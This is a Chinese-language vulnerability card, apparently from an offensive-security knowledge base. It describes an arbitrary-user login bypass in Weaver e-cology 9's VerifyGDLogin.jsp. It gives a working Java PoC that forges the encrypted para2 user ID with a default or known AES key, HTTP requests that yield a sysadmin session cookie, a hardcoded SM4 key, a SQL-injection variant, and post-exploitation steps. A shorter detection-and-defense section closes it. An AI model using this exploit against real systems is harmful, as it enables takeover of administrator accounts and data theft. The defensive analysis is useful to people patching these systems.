---
id: web-generic-auth-weaver-ecology9-verifygdlogin-aes-userid-any-login
title: 泛微 EC9 VerifyGDLogin.jsp 用已知/默认 AES 密钥加密用户 ID 直接登录：加密 para2 即得 sysadmin 会话
type: scenario
domain: web
path: web/generic/auth
technique: weaver-ecology9-verifygdlogin-aes-userid-login-bypass
aliases:
- VerifyGDLogin 任意用户登录
- SecurityRuleGdLogin0317
- PoppupRemindInfoUtil.decrypt
- AESpassword.properties
- ecology_JSessionid 获取
- EC9 任意登录
tags:
- java
- weaver
- ecology
- ec9
- e9
- auth-bypass
- arbitrary-user-login
- aes
- sm4
- default-key
- session
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: 泛微 e-cology 9.0 v10.58.3（原文：补丁 Ecology_security_20230725_v9.0_v10.58.3 的 SecurityRuleGdLogin0317 修复此问题）
verification:
  verified_by: verifier-V637
  verified_at: '2026-11-13T01:33:19+08:00'
  notes: 已对照原文与9张截图逐项核对：01 补丁 SecurityRuleGdLogin0317 过滤 para2 危险字符/长度并记日志；02 VerifyGDLogin.jsp 取 para/para1/para2，para1@->&后与para2以#拼接，TokenizerString2 拆 url+userid 后 decrypt 并 getUserCheck；03 PoppupRemindInfoUtil.decrypt 读 AESpassword.properties 的 pwd，空则默认1，USE_SM4 分支；04 SM4 SECRET_KEY 60fb3ed9-3e18-4f 且 USE_SM4=false；05 getUserCheck 用 id='+var3+' 拼 HrmResource/HrmResourceManager 查询；06 AES.decrypt 用 SHA1PRNG 种子派生128位密钥、Hex 密文；07 encryptAES_SunJCE('1','4DUa6Wq9')=E4D160ED60A81E804F24EE2AE592D66F；08 POST para2 后 302 下发 ecology_JSessionid；09 带 Cookie 访问 /api/hrm/login/getAccountList 回显 userid=1/loginid=sysadmin。修正：原文与截图 Cookie 为 aaaOhmJeYzN2NbvHFv1Vy，卡片 PoC 曾误写 aaaOhrnJeYzN2NbvHFv1Vy，已更正两处。affected_versions：原文第一段明确出现补丁包 Ecology_security_20230725_v9.0_v10.58.3 与 SecurityRuleGdLogin0317，卡片按此标注并注明来源，非臆测；原文未给出更细的受影响区间。dedup 仅命中草稿自身（同一卡已在库），其余 related 为 mobilemode token 链、e9 islogin、ecology10 appthirdlogin 等不同登录绕过链，非同链；dup-scan 未涉及。未验证点：PoC 未在本机执行；'登录白名单'与密钥来源属合理推断，原文未细述。
---

## 一句话结论

泛微 e-cology 9 的 `/login/VerifyGDLogin.jsp` 把请求参数 `para2` 经 `PoppupRemindInfoUtil.decrypt` 解密后直接当作 userid 交给 `VerifyGDLogin.getUserCheck` 建立会话，全程没有任何口令/票据校验；解密密钥取自 `WEB-INF/prop/AESpassword.properties` 的 `pwd`（为空时默认 `"1"`），AES 密钥由该字符串经 SHA1PRNG 派生，因此只要密钥为空（默认）或已知/可猜，攻击者就能加密任意用户 ID（如 sysadmin 的 `id=1`）提交该接口，响应直接下发 `ecology_JSessionid`，以目标用户身份登录后台。

## 原理

- **入口逻辑**：`login/VerifyGDLogin.jsp` 读取 `para`、`para1`、`para2`；`para1` 做 `@`→`&` 替换后与 `para2` 用 `#` 拼接覆盖 `para`，再 `Util.TokenizerString2(para, "#")` 拆成 `url` 与 `userid`；对 `userid` 执行 `PoppupRemindInfoUtil.decrypt(userid)`，随后 `new VerifyGDLogin().getUserCheck(request, response, userid)` 完成登录，最后 `response.sendRedirect(url)`。
- **解密实现**：`decrypt(String var0)` 先 `(new BaseBean()).getPropValue("AESpassword", "pwd")` 读配置；若为空则 `var1 = "1"`。再按 `SM4IntegrationUtil.USE_SM4`（默认 `false`）选择 SM4 或 `AES.decrypt(var0, var1)`。AES 解密为：`KeyGenerator.getInstance("AES")` + `SecureRandom.getInstance("SHA1PRNG")` 以密钥字符串为种子 `setSeed` + `init(128)` 生成 128 位密钥，`Cipher.getInstance("AES","SunJCE")` 解密，密文以 Hex 表示。
- **登录校验**：`getUserCheck` 用解密出的 `var3` 拼 SQL：`select * from HrmResource where id='<var3>'`，查不到再查 `HrmResourceManager`，然后读取用户字段构造 `User` 并写入会话。整个流程只信任"能提供正确密文的人"，而密文的加密密钥是静态配置值（默认空即 `"1"`），没有签名、时间戳、随机数或服务端票据，也不验证请求是否真的来自 GD 集成方。
- **为什么是任意用户登录**：攻击者不需要任何账号，只要知道/猜到密钥，就能自行调用 `AES.encrypt`（与 decrypt 同参数）把任意用户 ID 加密成 `para2`；服务端解密后按该 ID 完成登录。原文用密钥 `4DUa6Wq9` 加密 `"1"` 得到 `E4D160ED60A81E804F24EE2AE592D66F` 并成功获得 sysadmin 会话（`"userid":"1","loginid":"sysadmin"`）。
- **附带 SQL 注入面**：`getUserCheck` 的 userid 是字符串拼接而非参数绑定；若密钥已知，攻击者还可以加密含引号的表达式交给该查询（原文补丁 `SecurityRuleGdLogin0317` 正是过滤 `para2` 中的引号、分号等字符并记录日志，说明厂商也意识到注入风险）。原文未演示该注入路径，仅作为同入口的关联风险。
- **SM4 分支**：若目标启用了国密，`SM4IntegrationUtil.decrypt` 使用硬编码 `SECRET_KEY = "60fb3ed9-3e18-4f"`；默认 `USE_SM4=false`，走 AES 分支。

## 触发条件

- 目标为泛微 e-cology 9（原文对应 `Ecology_security_20230725_v9.0_v10.58.3` 补丁之前），`/login/VerifyGDLogin.jsp` 可从网络访问且在登录白名单中。
- `WEB-INF/prop/AESpassword.properties` 的 `pwd` 为空（默认走 `"1"`）或密钥已泄露/可猜（原文示例 `4DUa6Wq9`）。
- 未启用 SM4（默认 `false`）；启用时需使用硬编码 SM4 密钥。
- 目标用户 ID 已知（sysadmin 通常为 `id=1`，其他用户可枚举/猜测）。
- 请求未被 WAF/补丁规则拦截（补丁会检查 `para2` 长度与危险字符）。

## 利用步骤

1. 确认 `/login/VerifyGDLogin.jsp` 可访问，并尝试判断补丁状态（发送异常 `para2` 观察是否被规则拦截/记录）。
2. 确定密钥：先试默认空密钥（即 `"1"`）；若失败，尝试从配置泄露、源码或弱口令列表中获得的 `pwd`（原文示例 `4DUa6Wq9`）。
3. 用与 `AES.decrypt` 对称的参数加密目标用户 ID：`KeyGenerator("AES")` + `SecureRandom("SHA1PRNG").setSeed(key)` + `init(128)` + `Cipher("AES","SunJCE")`，输出 Hex。
4. 提交：`POST /login/VerifyGDLogin.jsp`，body `para=ViewRequest.jsp&para1=123&para2=<密文>`（`para` 实际被覆盖，可任意；`para1` 决定跳转 URL）。
5. 响应为 302 并带 `Set-Cookie: ecology_JSessionid=...`，说明登录成功。
6. 携带该 Cookie 访问需要鉴权的接口（如 `/api/hrm/login/getAccountList`）验证身份；随后利用管理员权限进一步操作（后台配置、上传、数据导出等）。

## PoC

```java
// 与 AES.decrypt 对称：明文用户 ID + 密钥 -> Hex 密文
import javax.crypto.*;
import javax.crypto.spec.SecretKeySpec;
import java.security.SecureRandom;

public class GenPara2 {
    public static void main(String[] args) throws Exception {
        String plain = "1";          // 目标用户 ID，sysadmin 通常为 1
        String key   = "4DUa6Wq9";   // AESpassword.properties 的 pwd；为空时用 "1"
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        SecureRandom sr = SecureRandom.getInstance("SHA1PRNG");
        sr.setSeed(key.getBytes());
        kg.init(128, sr);
        SecretKey sk = new SecretKeySpec(kg.generateKey().getEncoded(), "AES");
        Cipher c = Cipher.getInstance("AES", "SunJCE");
        c.init(Cipher.ENCRYPT_MODE, sk);
        byte[] out = c.doFinal(plain.getBytes());
        StringBuilder sb = new StringBuilder();
        for (byte b : out) sb.append(String.format("%02X", b));
        System.out.println(sb);
    }
}
```

```http
POST /login/VerifyGDLogin.jsp HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

para=ViewRequest.jsp&para1=123&para2=E4D160ED60A81E804F24EE2AE592D66F
```

```http
HTTP/1.1 302 Found
Set-Cookie: ecology_JSessionid=aaaOhmJeYzN2NbvHFv1Vy; path=/
Location: /login/123
```

```http
GET /api/hrm/login/getAccountList?__random__=1700633695101 HTTP/1.1
Host: target
Cookie: ecology_JSessionid=aaaOhmJeYzN2NbvHFv1Vy
```

说明：以上为原文分析/请求的结构化复现，未在本机执行；仅用于授权测试。密钥与密文取自原文示例（`4DUa6Wq9` / `E4D160ED...`），实际目标需按其配置重新生成。

## 变体与关联

- **密钥变体**：`pwd` 为空时默认 `"1"`；也可尝试配置备份、源码仓库、运维文档中泄露的值；SM4 分支使用硬编码 `60fb3ed9-3e18-4f`。
- **注入变体**：密钥已知时把加密明文换成 `1' or '1'='1` 等表达式，可尝试在 `HrmResource` 查询中注入（原文未演示，补丁规则主要过滤该路径）。
- **入口变体**：同一 `VerifyGDLogin` 逻辑可能被其它 GD/统一登录集成入口复用；可搜索 `PoppupRemindInfoUtil.decrypt` 的调用方。
- **关联**：[[web-generic-auth-weaver-ecology10-appthirdlogin-eteamsid-bypass]]（泛微 e-cology 10 前台认证绕过，产品线相近）、[[web-generic-auth-weaver-ecology-mobilemode-token-chain-login-bypass]]（泛微移动端 token 链绕过）、[[web-generic-auth-weaver-e9-islogin-xsslist-regex-bypass]]（泛微 e9 登录过滤器正则可绕过）；与它们相比，本卡是"自加密用户 ID + 静态密钥"直接签发会话。
- **边界**：`VerifyGDLogin.jsp` 被删除/网关拦截、密钥已随机化且不可得、启用 SM4 且密钥未知、补丁规则覆盖了密文校验、或目标用户 ID 不存在时，本链不成立。

## 检测与防御

- **认证修复**：不要用"能加密即认证"作为身份凭证；GD 集成应校验一次性票据/签名（带时间戳、nonce、服务端密钥）并绑定来源；禁止把用户可控密文直接映射为 session。
- **密钥治理**：`AESpassword.properties` 的 `pwd` 禁止为空，改用高熵随机密钥并定期轮换；SM4 硬编码密钥同样需要替换；密钥不得随源码/安装包泄露。
- **SQL 修复**：`HrmResource` 查询改为参数绑定，禁止字符串拼接 userid。
- **攻击面**：不使用 GD 登录时删除/禁用 `VerifyGDLogin.jsp` 或限制来源 IP；及时安装 `Ecology_security_20230725_v9.0_v10.58.3` 及后续补丁。
- **检测**：监控 `POST /login/VerifyGDLogin.jsp` 的 `para2` 为长 Hex、包含引号/分号/空格等特征（补丁规则会记录 `SecurityRuleGdLogin0317` 日志）；关注短时间内在无正常登录流程下直接下发 `ecology_JSessionid` 的 302 响应，以及 sysadmin/高权账号的异常登录来源。
- **响应**：发现利用后重置管理员口令、轮换 AES/SM4 密钥、检查是否已创建后门账号或执行后台操作，并审计同网段其它泛微实例。
